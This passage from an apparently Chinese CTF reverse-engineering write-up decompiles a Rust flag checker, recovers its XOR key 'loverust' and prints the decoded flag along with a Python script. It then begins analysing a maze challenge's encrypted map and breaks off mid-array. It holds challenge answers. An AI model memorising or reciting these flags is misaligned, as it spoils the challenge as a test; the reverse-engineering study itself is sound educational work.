class="number">25</span>] = <span class="number">14</span>;</span><br><span class="line">  sub_7FF790BE3960(v7, v6, <span class="number">26</span>i64);</span><br><span class="line">  sub_7FF790BE1EE0(v8, &amp;off_7FF790BFFE20);</span><br><span class="line">  <span class="built_in">std</span>::io::stdio::_print::hfb1cb878ecb43904(v8);</span><br><span class="line">  v9 = <span class="built_in">std</span>::io::stdio::<span class="built_in">stdout</span>::hd8319b1a11ac1aa1();</span><br><span class="line">  v15 = _$LT$<span class="built_in">std</span>..io..stdio..Stdout$u20$as$u20$<span class="built_in">std</span>..io..Write$GT$::flush::h6c721deb5b75b2b0(&amp;v9);</span><br><span class="line">  <span class="keyword">if</span> ( v15 )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = v15;</span><br><span class="line">    core::result::unwrap_failed::h77060c222a1dc3ba(</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;called `Result::unwrap()` on an `Err` value&quot;</span>,</span><br><span class="line">      <span class="number">43</span>,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v16,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)&amp;off_7FF790BFFBE0,</span><br><span class="line">      (__int64)&amp;off_7FF790BFFE30);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF790BE39E0(v10);</span><br><span class="line">  v11 = <span class="built_in">std</span>::io::stdio::<span class="built_in">stdin</span>::he1ba180739c71ab9();</span><br><span class="line">  v17 = <span class="built_in">std</span>::io::stdio::Stdin::read_line::h381832b7ef3a4ed2(&amp;v11, v10);</span><br><span class="line">  v18 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    v19[<span class="number">0</span>] = v18;</span><br><span class="line">    core::result::unwrap_failed::h77060c222a1dc3ba(</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;called `Result::unwrap()` on an `Err` value&quot;</span>,</span><br><span class="line">      <span class="number">43</span>,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)v19,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)&amp;off_7FF790BFFBE0,</span><br><span class="line">      (__int64)&amp;off_7FF790BFFE48);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = sub_7FF790BE4480(v10);</span><br><span class="line">  v3 = sub_7FF790BE2850(v1, v2);</span><br><span class="line">  sub_7FF790BE4BA0((<span class="type">unsigned</span> <span class="type">int</span>)v12, v3, v4, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_7FF790BFFDF8, <span class="number">8</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( (sub_7FF790BE3050(v12, v7) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF790BE1EE0(v13, &amp;off_7FF790BFFE98);</span><br><span class="line">    <span class="built_in">std</span>::io::stdio::_print::hfb1cb878ecb43904(v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF790BE1EE0(v14, &amp;off_7FF790BFFE78);</span><br><span class="line">    <span class="built_in">std</span>::io::stdio::_print::hfb1cb878ecb43904(v14);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF790BE2250(v12);</span><br><span class="line">  sub_7FF790BE2220(v10);</span><br><span class="line">  <span class="keyword">return</span> sub_7FF790BE2250(v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到v6是一个26个字节的数组，可能是被加密的flag，值为<font color=lime><strong>[18, 31, 20, 21, 30, 15, 95, 57, 43, 51, 7, 65, 58, 79, 95, 3, 16, 44, 53, 6, 58, 4, 26, 31, 0, 14]</strong></font>，而还有一些其他的变量v7、v8等作用未知，在<code>v15 = _$LT$std..io..stdio..Stdout$u20$as$u20$std..io..Write$GT$::flush::h6c721deb5b75b2b0(&amp;v9);</code>这一行打印了“请输入要比较的字符串：”，在<code>v17 = std::io::stdio::Stdin::read_line::h381832b7ef3a4ed2(&amp;v11, v10);</code>这一行读取了输入，<code>v1 = sub_7FF790BE4480(v10);</code>负责存储输入到v1，真正重要的是<code>sub_7FF790BE4BA0((unsigned int)v12, v3, v4, (unsigned int)&amp;unk_7FF790BFFDF8, 8i64);</code>这个函数，其中的第四个参数<code>&amp;unk_7FF790BFFDF8</code>是一个字符串<font color=red><strong>“loverust”</strong></font>(<font color=lime><strong>[0x6C, 0x6F, 0x76, 0x65, 0x72, 0x75, 0x73, 0x74]</strong></font>)，<br>观察这个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF790BE4BA0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)</span>	<span class="comment">//a1是v12，a2是v3，a3是v4，a4是字符串，a5是8</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-70h]</span></span><br><span class="line">  __int64 v10[<span class="number">2</span>]; <span class="comment">// [rsp+50h] [rbp-58h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+60h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">40</span>]; <span class="comment">// [rsp+68h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">24</span>]; <span class="comment">// [rsp+90h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v10[<span class="number">0</span>] = a4; <span class="comment">//按小端序存储字符串的地址00007FF790BFFDF8（F8FDBF90F77F0000）</span></span><br><span class="line">  v10[<span class="number">1</span>] = a5; <span class="comment">//8</span></span><br><span class="line">  v11 = a5;	<span class="comment">//8</span></span><br><span class="line">  v7 = sub_7FF790BE28C0(a2, a3); <span class="comment">//这个函数很奇怪，点进去查看发现只有一个参数a1，并返回a1；a2是输入数组，a3是输入长度，v7存储输入数组的地址</span></span><br><span class="line">  sub_7FF790BE2B30(v13, v7, v5); <span class="comment">//这个函数将 输入数组的地址、v5（貌似也是输入数组的地址）、0 赋值给 v13 指向的数组的第一、二、三个元素，返回result为2163AE3BEF0</span></span><br><span class="line">  sub_7FF790BE29D0(v12, v13, v10, &amp;v11);</span><br><span class="line">  sub_7FF790BE2AD0(a1, v12);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>sub_7FF790BE2B30(v13, v7, v5);</code>有以下主要五行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">result = a1; <span class="comment">//地址2163AE3BEF0</span></span><br><span class="line">*a1 = a2; <span class="comment">//输入数据的地址2163AE37E00</span></span><br><span class="line">a1[<span class="number">1</span>] = a3; <span class="comment">//地址2163AE37E18</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">0</span>i64;</span><br><span class="line"><span class="keyword">return</span> result; <span class="comment">//a1</span></span><br></pre></td></tr></table></figure>
<p>其中<code>sub_7FF790BE29D0(v12, v13, v10, &amp;v11);</code>有以下主要七行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">result = a1; <span class="comment">//初始化？？？</span></span><br><span class="line">*a1 = *a2; <span class="comment">//输入数据的地址2163AE37E00</span></span><br><span class="line">a1[<span class="number">1</span>] = a2[<span class="number">1</span>]; <span class="comment">//输入数据的地址结束点2163AE37E18</span></span><br><span class="line">a1[<span class="number">2</span>] = a2[<span class="number">2</span>]; <span class="comment">//0？？？</span></span><br><span class="line">a1[<span class="number">3</span>] = a3; <span class="comment">//字符串所在的地址00007FF790BFFDF8</span></span><br><span class="line">a1[<span class="number">4</span>] = a4; <span class="comment">//8</span></span><br><span class="line"><span class="keyword">return</span> result; <span class="comment">//a1</span></span><br></pre></td></tr></table></figure>
<p>其中<code>sub_7FF790BE2AD0(a1, v12);</code>有以下主要两行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF790BE4940();</span><br><span class="line"><span class="keyword">return</span> a1;</span><br></pre></td></tr></table></figure>
<p>其中<code>sub_7FF790BE4940();</code>有以下主要两行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF790BE4380(v4);</span><br><span class="line">sub_7FF790BE4B00(a1, v4);</span><br><span class="line"><span class="keyword">return</span> a1;</span><br></pre></td></tr></table></figure>
<p>其中v4是个40个字符的char，是各种地址的集合，观察<code>sub_7FF790BE4380</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">memcpy_0(a1, a2, <span class="number">0x28u</span>i64);</span><br><span class="line"><span class="keyword">return</span> a1;</span><br></pre></td></tr></table></figure>
<p>这里将a2的前40个字节复制给了a1，再观察<code>sub_7FF790BE4B00</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF790BE14B0();</span><br><span class="line"><span class="keyword">return</span> a1;</span><br></pre></td></tr></table></figure>
<p>再看<code>sub_7FF790BE14B0</code>，发现结构非常复杂，返回的<code>result</code>是输入字符的长度.<br><br>回到“主函数”<code>sub_7FF790BE4D20</code>，黑蓝色的部分返回的值只会是0或者1（也就是布尔值），并对应着不同的结果，猜测这个部分是加密和比较部分，查看<code>sub_7FF790BE3050</code>的主要部分（两个参数分别是a1和a2）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v7 = sub_7FF790BE46C0(a1, &amp;off_7FF790BFFD18);</span><br><span class="line">v8 = v2;</span><br><span class="line">v3 = sub_7FF790BE46C0(a2, &amp;off_7FF790BFFD18);</span><br><span class="line"><span class="keyword">return</span> sub_7FF790BE45B0(v7, v8, v3, v4) &amp; <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>先查看<code>sub_7FF790BE46C0</code>（第二个参数是一个library）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v4 = *(_QWORD *)(a1 + <span class="number">8</span>);</span><br><span class="line">v5 = *(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">sub_7FF790BE2CC0(v4, <span class="number">1u</span>i64, <span class="number">1u</span>i64, v5);</span><br><span class="line"><span class="keyword">return</span> sub_7FF790BE49E0(v4, v5, a2);</span><br></pre></td></tr></table></figure>
<p>发现v4指向地址<code>2163AE3DB60</code>（是一个很奇怪的字符串），v5是输入的长度，再查看<code>sub_7FF790BE2CC0</code>，发现主要是错误检查，最后返回的还是输入长度，最后result sub函数返回的result还是a1，回到<code>sub_7FF790BE3050</code>函数，发现最终的sub函数内部居然是比较函数memcmp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> a2 == a4 &amp;&amp; memcmp_0(a1, a3, a2) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>其中a2是输入长度，a4应该是flag的长度（实际上为26，0x1A），而a1是E开头的字符串，a3就是上文的v6（<font color=lime><strong>[0x12, 0x1f, 0x14, 0x15, 0x1e, 0x0f, 0x5f, 0x39, 0x2b, 0x33, 0x07, 0x41, 0x3a, 0x4f, 0x5f, 0x03, 0x10, 0x2c, 0x35, 0x06, 0x3a, 0x04, 0x1a, 0x1f, 0x00, 0x0e]</strong></font>），结合“主函数”后面的if和else，可知这就是用于比较的部分，到此为止，输入检测、存放输入的数组、加密的flag、flag长度、比较函数均已知，带入不同flag进行测试，发现是8个一组，对于其中每个位置的字符，假设每组第一个为t，则为<font color=red><strong>[t, t+1, t-1, t+2, t-17, t-2, t-11, t-8]</strong></font>（十进制，这里的数字不代表实际数字，而是在这个列表中的偏移量，程序把这些数据进行了某种混淆），其中t在某种程度上分多部分线性增加，考虑到“key”<font color=red><strong>loverust</strong></font>的ASCII码小端序排列恰好符合这个要求，将加密的flag与loverust字符串倒序循环异或，得到数组<font color=limegreen><strong>[102, 108, 97, 103, 123, 121, 48, 85, 95, 64, 114, 51, 95, 57, 48, 111, 100, 95, 64, 116, 95, 114, 117, 115, 116, 125]</strong></font>，转换得到<font color=deepskyblue><strong>flag{y0U_@r3_90od_@t_rust}</strong></font>.</p>
<p>附python代码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0x12</span>, <span class="number">0x1f</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x1e</span>, <span class="number">0x0f</span>, <span class="number">0x5f</span>, <span class="number">0x39</span>, <span class="number">0x2b</span>, <span class="number">0x33</span>, <span class="number">0x07</span>, <span class="number">0x41</span>, <span class="number">0x3a</span>, </span><br><span class="line"><span class="number">0x4f</span>, <span class="number">0x5f</span>, <span class="number">0x03</span>, <span class="number">0x10</span>, <span class="number">0x2c</span>, <span class="number">0x35</span>, <span class="number">0x06</span>, <span class="number">0x3a</span>, <span class="number">0x04</span>, <span class="number">0x1a</span>, <span class="number">0x1f</span>, <span class="number">0x00</span>, <span class="number">0x0e</span>]</span><br><span class="line">loverust = [<span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x76</span>, <span class="number">0x6F</span>, <span class="number">0x6C</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">  flag[i] ^= loverust[i % <span class="number">8</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="MazE："><a href="#MazE：" class="headerlink" title="MazE："></a>MazE：</h3><p>发现是经典的迷宫游戏，开局提示用<code>wsad</code>来进行<code>上下左右</code>移动，要从左上角走到右下角，且只能看见周围九宫格的区域，flag是最短路径的md5数值，并且路径长度长达936.</p>
<p>先对main函数进行分析，发现有<code>sub_56EBE386F469</code>（下称<code>mapgen</code>）和<code>sub_56EBE386F68F</code>（下称<code>move_detect</code>）两个函数，根据上方<code>mapgen</code>先运行，之后进入死循环的<code>mapgen</code>以及<code>move_detect</code>可以推断出<code>mapgen</code>负责初始化以及后续生成迷宫视图，<code>move_detect</code>用于读取输入的方向并改变位置.</p>
<p>观察视图生成函数，发现a2和a3用于记录坐标，而初始代入值是<code>(1,1)</code>，当坐标为<code>(97,97)</code>时判定胜利，还有三个执行三次的循环，则是生成第一二三行的迷宫视图，char a1的0-2（i）、4-6（j）、8-10（k）用于存储和显示当前的9个格子的地图，对于其中的一个循环有：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">    a1[i] = sub_56EBE386F41B(&amp;unk_56EBE38720A0, (<span class="type">unsigned</span> <span class="type">int</span>)(dword_56EBE3872020[i] + a2), (<span class="type">unsigned</span> <span class="type">int</span>)(dword_56EBE3872060[i] + a3));</span><br><span class="line">a1[<span class="number">3</span>] = <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
<p>可以看出<code>sub_56EBE386F41B</code>（下称<code>map_encryptor</code>）用于结合加密地图数据<code>&amp;unk_56EBE38720A0</code>（下称<code>encmap</code>）和要显示的位置（后两个参数）来现实对应的字符（墙或者路），注意到其中有两个dword，分别记为d2和d3，有：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d2 = <span class="number">-1</span><span class="number">-1</span><span class="number">-1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>（<span class="number">-1</span>为等效）</span><br><span class="line">d3 = <span class="number">-1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">-1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">-1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>而对应绘制的ijk则为<code>0 1 2 | 4 5 6 | 8 9 10</code>，不妨设<code>（a2，a3）</code>为原点，则绘制的三行九宫格简化坐标为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">-1</span>, <span class="number">-1</span>) (<span class="number">-1</span>,  <span class="number">0</span>) (<span class="number">-1</span>,  <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">( <span class="number">0</span>, <span class="number">-1</span>) ( <span class="number">0</span>,  <span class="number">0</span>) ( <span class="number">0</span>,  <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">( <span class="number">1</span>, <span class="number">-1</span>) ( <span class="number">1</span>,  <span class="number">0</span>) ( <span class="number">1</span>,  <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>可以看出a2控制的是行，a3控制的是列，迷宫坐标范围至少为<code>(0, 0)</code>到 <code>(98, 98)</code> ，即大小至少为<code>99*99</code>，观察加密函数<code>map_encryptor</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_56EBE386F41B</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_56EBE386F3A1(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">48LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">49LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">101LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，v4根据地图和坐标位置返回两种特殊的非零状态或者零状态，如果为零就返回0x48（0的ASCII码），普通情况下的非零状态（1）返回0x49（1的ASCII码），特殊情况返回0x101（e的ASCII码），很明显，返回0时是路，返回1时是墙，返回e时大概是当前位置或者终点.<br><br>再查看内部的<code>sub_56EBE386F3A1</code>，发现返回的是<code>((int)(unsigned __int8)sub_56EBE386F329(a1, (unsigned int)((99 * a2 + a3) / 8)) &gt;&gt; (7 - (99 * a2 + a3) % 8)) &amp; 1;</code>，也就是说当 <code>sub_56EBE386F329(a1, ((99 * a2 + a3) / 8)) &gt;&gt; (7 - (99 * a2 + a3) % 8))</code> 返回的值是偶数时对应的值是<code>0</code>，奇数时对应<code>1</code>.</p>
<p>再看<code>sub_56EBE386F329</code>，发现会返回<code>encmap</code>的第<code>((99 * a2 + a3) // 8) + 1</code>个字节异或字符串 <code>tgrddf55</code> 的第 <code>((99 * a2 + a3) // 8) + 1</code> 个字符的ASCII值，根据这个值的奇偶性来决定是墙是路.</p>
<p>接下来首先提取<code>encmap</code>：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">encmap = [</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x98</span>, <span class="number">0x8D</span>, <span class="number">0x9B</span>, <span class="number">0x9B</span>, <span class="number">0x99</span>, <span class="number">0xCA</span>, <span class="number">0xCA</span>, <span class="number">0x8B</span>, <span class="number">0x98</span>, <span class="number">0x8D</span>, <span class="number">0x9B</span>, <span class="number">0x94</span>, <span class="number">0x22</span>, <span class="number">0x74</span>, <span class="number">0x25</span>, <span class="number">0x70</span>, <span class="number">0x26</span>, <span class="number">0x76</span>, <span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x74</span>, <span class="number">0x72</span>, <span class="number">0x35</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0xCC</span>, <span class="number">0xD9</span>, <span class="number">0xCE</span>, <span class="number">0x9A</span>, <span class="number">0xCD</span>, <span class="number">0xDB</span>, <span class="number">0x8A</span>, <span class="number">0x8E</span>, <span class="number">0x9D</span>, <span class="number">0xCD</span>, <span class="number">0xCF</span>, <span class="number">0x9E</span>, <span class="number">0xB3</span>, <span class="number">0x20</span>, <span class="number">0x20</span>,</span><br><span class="line"><span class="number">0x34</span>, <span class="number">0x23</span>, <span class="number">0x62</span>, <span class="number">0x35</span>, <span class="number">0x60</span>, <span class="number">0x22</span>, <span class="number">0x61</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x3D</span>, <span class="number">0xC8</span>, <span class="number">0xDE</span>, <span class="number">0xCF</span>, <span class="number">0x99</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xCA</span>, <span class="number">0xD9</span>, <span class="number">0xC8</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0x9A</span>, <span class="number">0xDD</span>, <span class="number">0x24</span>, <span class="number">0x64</span>, <span class="number">0x31</span>, <span class="number">0x26</span>, <span class="number">0x32</span>, <span class="number">0x35</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0x1D</span>, <span class="number">0xCE</span>, <span class="number">0x8B</span>, <span class="number">0xCD</span>, <span class="number">0x9E</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xCB</span>, <span class="number">0xC9</span>, <span class="number">0x99</span>, <span class="number">0x8A</span>, <span class="number">0xCF</span>, <span class="number">0xCD</span>, <span class="number">0x99</span>, <span class="number">0x70</span>, <span class="number">0x25</span>, <span class="number">0x73</span>, <span class="number">0x37</span>, <span class="number">0x25</span>, <span class="number">0x34</span>, <span class="number">0x72</span>, <span class="number">0x64</span>, <span class="number">0x74</span>, <span class="number">0x60</span>, <span class="number">0x72</span>, <span class="number">0x67</span>, <span class="number">0x8F</span>,</span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x9C</span>, <span class="number">0xCE</span>, <span class="number">0x9E</span>, <span class="number">0xDF</span>, <span class="number">0x99</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8F</span>, <span class="number">0x8C</span>, <span class="number">0x9B</span>, <span class="number">0x84</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x32</span>, <span class="number">0x71</span>, <span class="number">0x35</span>, <span class="number">0x26</span>, <span class="number">0x24</span>, <span class="number">0x74</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x62</span>, <span class="number">0x26</span>, <span class="number">0x32</span>, <span class="number">0x8A</span>, <span class="number">0x8C</span>, <span class="number">0xCA</span>, <span class="number">0xCF</span>, <span class="number">0xDF</span>, <span class="number">0x8C</span>, <span class="number">0x8C</span>, <span class="number">0x8F</span>, <span class="number">0xCE</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0xDF</span>, <span class="number">0xB0</span>, <span class="number">0x76</span>, <span class="number">0x22</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x23</span>, <span class="number">0x22</span>, <span class="number">0x21</span>, <span class="number">0x7B</span>, <span class="number">0x9C</span>, <span class="number">0xDF</span>, <span class="number">0xCA</span>, <span class="number">0xDF</span>, <span class="number">0x89</span>, <span class="number">0xCC</span>, <span class="number">0xDE</span>, <span class="number">0x8F</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0xCB</span>,</span><br><span class="line"><span class="number">0xCF</span>, <span class="number">0x66</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x71</span>, <span class="number">0x77</span>, <span class="number">0x75</span>, <span class="number">0x61</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x76</span>, <span class="number">0x64</span>, <span class="number">0x34</span>, <span class="number">0x08</span>, <span class="number">0x9B</span>, <span class="number">0xDF</span>, <span class="number">0x8E</span>, <span class="number">0x9D</span>, <span class="number">0x9D</span>, <span class="number">0xDE</span>,</span><br><span class="line"><span class="number">0xDE</span>, <span class="number">0x8C</span>, <span class="number">0xDA</span>, <span class="number">0x8A</span>, <span class="number">0x9E</span>, <span class="number">0x8A</span>, <span class="number">0x66</span>, <span class="number">0x25</span>, <span class="number">0x25</span>, <span class="number">0x23</span>, <span class="number">0x64</span>, <span class="number">0x31</span>, <span class="number">0x25</span>, <span class="number">0x23</span>, <span class="number">0x33</span>, <span class="number">0x71</span>, <span class="number">0x65</span>, <span class="number">0x33</span>, <span class="number">0x9A</span>, <span class="number">0xDA</span>,</span><br><span class="line"><span class="number">0x9B</span>, <span class="number">0xC9</span>, <span class="number">0xD8</span>, <span class="number">0x8A</span>, <span class="number">0xCF</span>, <span class="number">0x8D</span>, <span class="number">0xDA</span>, <span class="number">0x9F</span>, <span class="number">0xDB</span>, <span class="number">0x8D</span>, <span class="number">0xC6</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x71</span>, <span class="number">0x21</span>, <span class="number">0x66</span>, <span class="number">0x37</span>, <span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x23</span>, <span class="number">0xCF</span>, <span class="number">0xDA</span>, <span class="number">0x9C</span>, <span class="number">0xD9</span>, <span class="number">0x9E</span>, <span class="number">0x8E</span>, <span class="number">0x9D</span>, <span class="number">0xDF</span>, <span class="number">0xDF</span>, <span class="number">0xDE</span>, <span class="number">0x9D</span>, <span class="number">0x8C</span>, <span class="number">0xB5</span>, <span class="number">0x30</span>, <span class="number">0x26</span>, <span class="number">0x70</span>, <span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x35</span>, <span class="number">0x26</span>, <span class="number">0x32</span>, <span class="number">0x35</span>, <span class="number">0x30</span>, <span class="number">0x27</span>, <span class="number">0x65</span>, <span class="number">0x6F</span>, <span class="number">0xDE</span>, <span class="number">0xC8</span>, <span class="number">0x88</span>, <span class="number">0x8F</span>, <span class="number">0x9B</span>, <span class="number">0x99</span>, <span 